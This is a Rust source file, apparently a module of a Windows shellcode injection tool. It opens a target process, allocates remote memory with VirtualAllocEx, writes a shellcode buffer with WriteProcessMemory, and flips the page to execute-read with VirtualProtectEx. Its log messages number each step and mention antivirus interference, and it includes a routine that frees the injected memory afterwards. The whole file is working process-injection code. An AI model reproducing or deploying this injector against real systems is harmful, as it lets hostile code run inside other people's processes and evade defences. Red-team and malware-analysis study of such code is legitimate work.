#[cfg(windows)]
use crate::log::LogSink;
#[cfg(windows)]
use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE};
#[cfg(windows)]
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
#[cfg(windows)]
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
#[cfg(windows)]
use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

#[cfg(windows)]
pub fn free_remote(process: HANDLE, base: *mut core::ffi::c_void, log: &LogSink) {
    log.detail("[cleanup] VirtualFreeEx — MEM_RELEASE");
    unsafe {
        let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
    }
}

#[cfg(windows)]
pub fn cleanup(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
    log.step(format!(
        "[CLEANUP] Freeing {} bytes at 0x{:X} in PID {}",
        size, remote_base, pid
    ));
    let process = match unsafe { OpenProcess(PROCESS_VM_OPERATION, FALSE, pid) } {
        Ok(h) => h,
        Err(e) => {
            log.error(format!("OpenProcess failed: {e}"));
            return;
        }
    };
    let base = remote_base as *mut core::ffi::c_void;
    let result = unsafe { VirtualFreeEx(process, base, 0, MEM_RELEASE) };
    let _ = unsafe { CloseHandle(process) };
    match result {
        Ok(()) => log.step("[CLEANUP] Remote memory freed successfully."),
        Err(e) => log.error(format!("[CLEANUP] VirtualFreeEx failed: {e}")),
    }
}

#[cfg(windows)]
pub fn write_remote_payload(
    process: HANDLE,
    shellcode: &[u8],
    total_steps: u32,
    log: &LogSink,
) -> Result<*mut core::ffi::c_void, String> {
    let size = shellcode.len();

    log.step(format!(
        "[2/{}] VirtualAllocEx — MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE",
        total_steps
    ));
    let base = unsafe {
        VirtualAllocEx(
            process,
            None,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if base.is_null() {
        return Err(
            "VirtualAllocEx returned NULL — allocation failed (check AV/privileges)".to_string(),
        );
    }
    log.info(format!(
        "      allocated RW region at remote address {:#p} ({} bytes)",
        base, size
    ));

    log.step(format!(
        "[3/{}] WriteProcessMemory — {} bytes",
        total_steps, size
    ));
    let mut written: usize = 0;
    if let Err(e) = unsafe {
        WriteProcessMemory(
            process,
            base as *const core::ffi::c_void,
            shellcode.as_ptr() as *const core::ffi::c_void,
            size,
            Some(&mut written),
        )
    } {
        free_remote(process, base, log);
        return Err(format!("WriteProcessMemory failed: {e}"));
    }
    log.info(format!("      wrote {} bytes", written));

    log.step(format!(
        "[4/{}] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ",
        total_steps
    ));
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    if let Err(e) = unsafe {
        VirtualProtectEx(
            process,
            base as *const core::ffi::c_void,
            size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    } {
        free_remote(process, base, log);
        return Err(format!("VirtualProtectEx failed: {e}"));
    }
    log.info(format!(
        "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
        old_protect.0
    ));

    Ok(base)
}

#[cfg(not(windows))]
pub fn cleanup(_pid: u32, _remote_base: u64, _size: usize, log: &crate::log::LogSink) {
    log.error("Cleanup requires Windows — this build is running on a non-Windows host");
}
